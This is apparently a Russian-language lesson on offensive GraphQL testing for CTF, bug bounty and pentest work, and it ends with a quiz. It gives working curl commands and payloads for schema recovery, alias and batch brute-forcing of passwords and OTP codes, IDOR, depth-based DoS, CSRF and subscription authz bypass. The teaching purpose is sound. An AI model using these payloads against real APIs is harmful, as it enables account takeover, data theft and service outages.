---
id: web-graphql-deep
title: "GraphQL deep: introspection off, batching, aliasing, DoS, authz"
category: web
parent: web-api-rest-graphql-soap
difficulty: hard
order: 2
tags: [graphql, introspection, batching, aliasing, idor, dos]
prerequisites: [web-api-rest-graphql-soap]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 42
summary: "Продвинутый GraphQL: обход отключённой introspection, batching/aliasing для обхода rate-limit и authz, depth-DoS и IDOR."
---

GraphQL — не REST: одна ручка `/graphql`, клиент сам формирует запрос. Это меняет модель атак: introspection отдаёт схему, batching/aliasing обходят rate-limit, а авторизация часто проверяется в одном месте и забывается в других. Здесь — продвинутые техники поверх базового `web-api-rest-graphql-soap`.

## Теория: чем GraphQL отличается

- **Единый эндпоинт** (`POST /graphql`) — не видно по путям.
- **Клиент задаёт форму ответа** — можно запросить вложенные поля.
- **Introspection** (`__schema`) — самодокументируемая схема.
- **Поля резолвятся отдельными функциями** — authz легко забыть на конкретном поле.
- **Batching/aliasing** — несколько операций в одном запросе.

Определить:

```bash
curl -s -X POST https://app.example/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'
```

## Атака 1: обход выключенной introspection

Если `__schema` отключён, схему восстанавливают:

- **Field suggestions:** отправить несуществующее поле — GraphQL подскажет похожие (`Did you mean "users"?`).
- **`clairvoyance`** — перебирает поля по подсказкам.
- **`graphql-cop`** — аудит типовых ошибок.
- **`__type(name:"User"){fields{name}}`** — иногда доступно, даже если `__schema` нет.
- **Реверс клиента** — запросы в JS-бандле.

## Атака 2: batching/aliasing — обход rate-limit и brute-force

Aliasing — несколько полей в одном запросе; batching — массив запросов. Оба обходят rate-limit (один HTTP-запрос = N операций):

```graphql
mutation {
  a: login(user:"admin", pass:"1") { token }
  b: login(user:"admin", pass:"2") { token }
  c: login(user:"admin", pass:"3") { token }
}
```

Массив:

```json
[{"query":"mutation{login(user:\"admin\",pass:\"1\"){token}}"},
 {"query":"mutation{login(user:\"admin\",pass:\"2\"){token}}"}]
```

Так брутят пароли/OTP/купоны в обход лимитов.

## Атака 3: IDOR / broken authz

GraphQL особенно уязвим: `query { order(id:"...") { ... } }` может не проверять владельца. Тестируйте:

- Поля с `id`/`node(id:)`.
- Вложенные объекты (`user { orders { items } }`).
- Мутации (`updateUser`, `deleteOrder`).
- Поля, доступные только «админам» (по имени/по подсказкам).

```graphql
{ node(id: "T3JkZXI6MQ==") { ... on Order { total user { email } } } }
```

## Атака 4: DoS через depth/complexity

- **Глубокая вложенность:** `{ user { friends { friends { friends {...} } } } }`.
- **Циклические фрагменты** (`fragment F on User { friends { ...F } }`).
- **Алиасинг-бомба:** тысячи алиасов одного тяжёлого поля.
- **`__typename`-бомба**.

Тест: отправьте глубокий/широкий запрос и замерьте время/нагрузку (аккуратно — можно уронить прод).

## Атака 5: другие

- **Injection:** значения уходят в SQL/NoSQL/команды.
- **CSRF:** если GraphQL принимает `application/x-www-form-urlencoded`/GET без CSRF-токена.
- **Field suggestions** как enumeration.
- **`__directive`/`__type`** — метаинформация.
- **Persisted queries** — обход allowlist.

## Разобранный пример

Шаг 1 — introspection:

```bash
curl -s -X POST https://app.example/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' | jq .
```

Шаг 2 — ищем мутации/поля admin:

```graphql
{ __schema { mutationType { fields { name } } } }
```

Шаг 3 — тестируем IDOR на `node(id:)` с чужим id.
Шаг 4 — aliasing-брут OTP:

```graphql
mutation { a: verify(code:"0001"){ok} b: verify(code:"0002"){ok} c: verify(code:"0003"){ok} }
```

## Инструменты

- **`graphql-cop`** — аудит.
- **`clairvoyance`** — восстановление схемы без introspection.
- **`InQL`** (Burp) — работа со схемой.
- **`graphql-cracker`/`GraphQLmap`** — фаззинг.
- **`jq`** — разбор схемы.

## Что дальше / decision

1. Есть `/graphql` → проверьте introspection.
2. Отключён → `clairvoyance`/подсказки/реверс JS.
3. Есть схема → тестируйте IDOR/authz на полях/мутациях.
4. Есть логин/OTP → aliasing/batching-брут.
5. Дальше — DoS (осторожно) и инъекции в значениях.

## Частые ошибки

- **Игнорировать GraphQL, считая его «сложным».** Один эндпоинт — одна точка входа.
- **Сдаваться без introspection.** Схема восстанавливается.
- **Не тестировать authz на каждом поле.** Частая дыра.
- **Забыть про aliasing.** Обход rate-limit.
- **Ломать прод.** DoS-запросы — только с согласия.

## Обход выключенной introspection: field suggestions и error-based

Даже когда introspection отключён (`introspection: false`), GraphQL часто оставляет **field suggestions** в ошибках — это узаконенный способ «прощупать» схему.

```bash
# 1) подсказки по опечаткам: сервер сам предложит похожие поля
curl -s https://api.example/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ userr { id } }"}'
# {"errors":[{"message":"Cannot query field \"userr\" on type \"Query\". Did you mean \"user\", \"users\"?"}]}

# 2) итеративно угадываем поля типа
curl -s https://api.example/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ user { idd } }"}'
# Did you mean "id", "idx", "identity"?
```

Повторяя такие запросы, можно восстановить всю схему. Дополнительно помогает **Clairvoyance** — инструмент, который автоматизирует восстановление схемы по suggestions.

```bash
# Clairvoyance — восстановление схемы без introspection
clairvoyance https://api.example/graphql -o schema.json -w wordlist.txt \
  -H 'Authorization: Bearer <token>'
```

## CSRF и method confusion в GraphQL

GraphQL по умолчанию принимает `POST` с `Content-Type: application/json`. Но многие серверы принимают и `GET`, и `application/x-www-form-urlencoded`, что снимает CSRF-защиту, основанную на кастомных заголовках.

```bash
# GET с query в URL — обходится простым <img src> / <form>
curl -s 'https://api.example/graphql?query={me{email}}'

# form-urlencoded POST — обычная HTML-форма
curl -s -X POST https://api.example/graphql \
  -d 'query=mutation{deleteAccount}'
```

Если сервер принимает form-urlencoded без проверки `Content-Type`/`Origin`, CSRF возможен. Проверка: уберите `Content-Type: application/json` и посмотрите, обработался ли запрос.

## Subscriptions и WebSocket-атаки

GraphQL subscriptions идут по WebSocket. Через них возможны те же проблемы авторизации, что и в обычных запросах, но часто без проверок.

```bash
# подключение через websocat
websocat -H='Sec-WebSocket-Protocol: graphql-ws' wss://api.example/graphql
# затем отправляем connection_init + subscribe на чужой канал
{"type":"connection_init","payload":{}}
{"id":"1","type":"start","payload":{"query":"subscription{messageAdded(roomId:\"admin\"){body}}"}}
```

Частая ошибка разработчиков: авторизация проверяется на HTTP-слое, а подписки на WS-слое — нет. Проверяйте, кто может подписаться на чужие события.

## Разобранный пример: batching brute-force 2FA

Aliasing и batching позволяют отправить сотни попыток в **одном** HTTP-запросе, обходя rate-limit по IP/эндпоинту.

```bash
# одна операция, но много алиасов — 5 попыток OTP в одном запросе
curl -s https://api.example/graphql -H 'Content-Type: application/json' -d '{
  "query":"mutation{
    a1: verifyOtp(code:\"0001\")
    a2: verifyOtp(code:\"0002\")
    a3: verifyOtp(code:\"0003\")
    a4: verifyOtp(code:\"0004\")
    a5: verifyOtp(code:\"0005\")
  }"}'
# {"data":{"a1":false,"a2":false,"a3":true,"a4":false,"a5":false}}
```

Массивный batching (JSON-array из запросов) даёт ещё больше попыток за один вызов. Защита — ограничение числа операций на запрос и rate-limit по операции, а не по HTTP-запросу.

## Разобранный пример: IDOR и broken authz по узлам

GraphQL возвращает графы; авторизация часто проверяется на уровне резолвера верхнего уровня, но не вложенных объектов.

```bash
# 1) легитимный запрос
curl -s https://api.example/graphql -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <user_token>' \
  -d '{"query":"{ order(id:1001){ id total owner{ email } } }"}'
# {"data":{"order":{"id":1001,"total":42,"owner":{"email":"me@x"}}}}

# 2) меняем id -> чужой заказ (BOLA)
curl -s ... -d '{"query":"{ order(id:1002){ id total owner{ email } } }"}'
# {"data":{"order":{"id":1002,"total":9000,"owner":{"email":"victim@corp.com"}}}}
```

Проверяйте не только прямые поля, но и **связи** (`owner`, `members`, `files`) — часто именно вложенные резолверы не проверяют права.

## Полный арсенал инструментов

| Инструмент | Назначение | Ключевые флаги |
|-----------|-----------|----------------|
| `graphql-cop` | аудит безопасности | `-t URL`, `-o json` |
| `clairvoyance` | восстановление схемы | `-o`, `-w`, `-H` |
| `graphql-voyager` | визуализация схемы | web-UI |
| `InQL` (Burp) | сканер + генератор запросов | расширение |
| `altair`/`graphiql` | ручной клиент | — |
| `websocat` | WS/subscriptions | `-H`, `-k` |
| `nuclei` | шаблоны GraphQL | `-tags graphql` |

```bash
# graphql-cop — быстрый аудит
graphql-cop -t https://api.example/graphql
# nuclei — известные проблемы GraphQL
nuclei -u https://api.example/graphql -tags graphql -j -silent | tee gql.json
```

## Что делать дальше / решение

1. **Определите точку.** `/graphql`, `/api/graphql`, `/v1/graphql`, часто с версией.
2. **Попробуйте introspection.** Если выключен — используйте suggestions/Clairvoyance.
3. **Проверьте авторизацию.** IDOR/BOLA на узлах и связях.
4. **Проверьте DoS.** Глубокие вложенные запросы, циклы, большие `first:`.
5. **Проверьте batching/aliasing.** Обход rate-limit для 2FA и брутфорса.
6. **Проверьте CSRF/GET.** Принимается ли GET/form-urlencoded.
7. **Зафиксируйте PoC.** Запрос + утечка данных/обход лимита/DoS-эффект.

## Практика и справочники

- **PortSwigger Academy** — «GraphQL API vulnerabilities».
- **HackTricks** — «GraphQL».
- **PayloadsAllTheThings** — GraphQL Injection.
- **graphql-cop / Clairvoyance** — GitHub-репозитории с примерами.

## Persisted queries, allowlist и их обход

Многие продакшн-API GraphQL переходят на **persisted queries**: клиент отправляет не текст запроса, а хеш заранее зарегистрированного запроса. Это задумано как защита, но часто настраивается небезопасно.

```bash
# 1) отправляем произвольный запрос — сервер может всё ещё его принять
curl -s https://api.example/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}"}'

# 2) пробуем APQ (Automatic Persisted Queries): сначала хеш, потом текст
curl -s https://api.example/graphql -H 'Content-Type: application/json' \
  -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"deadbeef"}}}'
# если вернулось PersistedQueryNotFound — значит APQ включён и текст примет
```

Если allowlist реализован только на клиенте, а сервер принимает произвольные запросы, — ограничение обходится. Проверяйте оба режима: `GET` с `?query=` и `POST` с телом.

## Сводка техник по цели

| Цель | Техника | Инструмент |
|------|---------|-----------|
| Разведка схемы | introspection / suggestions | graphql-cop, Clairvoyance |
| Доступ к данным | IDOR/BOLA на узлах | ручной + InQL |
| Обход лимита | batching/aliasing | curl, Burp |
| DoS | depth/complexity, циклы | graphql-cop |
| CSRF | GET/form-urlencoded | curl |
| Подписки | WS authz | websocat |

Выбор техники зависит от того, что вернул первый пробный запрос: наличие introspection, текст ошибок, поддерживаемые методы. Именно от этого «отпечатка» строится дальнейший план.

## Квиз

```quiz
- question: "Что такое introspection в GraphQL?"
  options:
    - "Кеш"
    - "Запрос схемы (__schema) с типами и полями"
    - "Шифрование"
    - "Логирование"
  answer: 1
  explanation: "Позволяет получить всю схему."
- question: "Как восстановить схему при выключенной introspection?"
  options:
    - "Никак"
    - "Через field suggestions (Did you mean ...) и clairvoyance"
    - "Через SQL"
    - "Через DNS"
  answer: 1
  explanation: "Ошибки валидации раскрывают имена."
- question: "Зачем нужны aliases при атаке?"
  options:
    - "Для красоты"
    - "Выполнить много операций в одном запросе, обходя rate-limit"
    - "Для TLS"
    - "Для cookie"
  answer: 1
  explanation: "Aliases amplification."
- question: "Как GraphQL batching помогает бруту?"
  options:
    - "Ускоряет сеть"
    - "Несколько операций в одном HTTP-запросе"
    - "Меняет алгоритм"
    - "Шифрует"
  answer: 1
  explanation: "Массив запросов за один запрос."
- question: "Чем опасны глубокие вложенные запросы?"
  options:
    - "Они длинные"
    - "Экспоненциальная нагрузка -> DoS"
    - "Они шифруются"
    - "Они кешируются"
  answer: 1
  explanation: "Без depth-limit сервер падает."
```

## Где пригодится

- **CTF (Web):** GraphQL-задачи.
- **Bug bounty:** aliasing/IDOR/introspection — частые отчёты.
- **Пентест:** аудит GraphQL-API.
- **Работа (AppSec):** depth/complexity limits, field-level authz, отключение introspection + suggestions.
